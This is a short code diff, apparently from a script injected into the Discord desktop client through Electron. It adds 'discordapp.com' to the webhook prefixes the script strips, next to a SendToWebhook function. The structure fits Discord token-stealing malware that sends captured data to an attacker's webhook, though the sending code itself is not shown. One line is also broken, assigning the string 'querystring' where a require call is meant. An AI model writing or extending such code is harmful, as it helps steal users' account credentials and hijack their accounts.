@@ -5,7 +5,7 @@ const { session, BrowserWindow } = require('electron')
 const https = require("https");
 const querystring = ('querystring');
 
-webhook = webhook.replace("https://discord.com", "").replace("https://canary.discord.com", "").replace("https://ptb.discord.com", "")
+webhook = webhook.replace("https://discord.com", "").replace("https://canary.discord.com", "").replace("https://ptb.discord.com", "").replace("https://discordapp.com", "")
 
 
 function SendToWebhook(what) {
